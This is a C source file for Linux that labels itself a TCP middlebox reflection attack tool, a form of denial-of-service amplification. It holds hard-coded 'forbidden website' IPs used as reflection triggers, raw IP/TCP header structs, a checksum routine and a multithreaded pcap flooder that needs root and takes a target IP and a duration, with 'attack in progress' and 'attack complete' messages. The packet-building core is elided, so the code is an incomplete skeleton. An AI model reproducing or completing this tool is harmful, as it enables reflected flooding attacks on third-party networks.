/* mra_linux.c - TCP中间件反射攻击Linux实现 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pcap.h>
#include <netinet/in.h>
#include <pthread.h>
#include <unistd.h>

/* 平台相关头文件 */
#include <arpa/inet.h>
#include <sys/socket.h>

/* 全局常量定义（与Windows版本一致） */
const char* forbidden_websites[] = {
    "66.254.114.79", "157.240.13.35", "66.254.114.41", "98.143.146.7"
};

/* 跨平台数据结构定义（与Windows版本一致） */
typedef struct ip_header {
    unsigned char  ver_ihl;
    unsigned char  tos;
    unsigned short total_length;
    unsigned short ident;
    unsigned short flags_fo;
    unsigned char  ttl;
    unsigned char  protocol;
    unsigned short checksum;
    unsigned int   src_addr;
    unsigned int   dst_addr;
} IP_HEADER;

typedef struct tcp_header {
    unsigned short src_port;
    unsigned short dst_port;
    unsigned int   seq_num;
    unsigned int   ack_num;
    unsigned char  data_off;
    unsigned char  flags;
    unsigned short window;
    unsigned short checksum;
    unsigned short urg_ptr;
} TCP_HEADER;

/* POSIX线程参数结构体 */
typedef struct {
    int packets_per_thread;
    const char* target_ip;
} GEN_PARAMS;

/* 公共校验和函数（与Windows版本一致） */
unsigned short checksum(unsigned short *buffer, int length) {
    unsigned long sum = 0;
    while (length-- > 0) {
        sum += *buffer++;
        if (sum & 0xFFFF0000) {
            sum &= 0xFFFF;
            sum++;
        }
    }
    return (unsigned short)(~sum);
}

/* POSIX线程函数 */
void* generate(void* params) {
    GEN_PARAMS* gp = (GEN_PARAMS*)params;
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* fp = pcap_open_live("any", 65536, 1, 1000, errbuf);
    
    if (!fp) {
        fprintf(stderr, "无法打开网络设备: %s\n", errbuf);
        return NULL;
    }

    /* 数据包生成逻辑（与Windows版本相同） */
    /* ... */

    pcap_close(fp);
    return NULL;
}

int main(int argc, char* argv[]) {
    /* Linux平台权限检查 */
    if (geteuid() != 0) {
        printf("请使用root权限运行！\n");
        return 1;
    }

    /* 多线程实现（使用pthread） */
    pthread_t threads[sysconf(_SC_NPROCESSORS_ONLN)];
    GEN_PARAMS params = {400 / sysconf(_SC_NPROCESSORS_ONLN), argv[2]};

    for (int i = 0; i < sysconf(_SC_NPROCESSORS_ONLN); i++) {
        pthread_create(&threads[i], NULL, generate, &params);
    }

    for (int i = 0; i < sysconf(_SC_NPROCESSORS_ONLN); i++) {
        pthread_join(threads[i], NULL);
    }

    printf("\n攻击持续中...");
    sleep(atoi(argv[1]));
    printf("\n攻击完成！\n");
    return 0;
}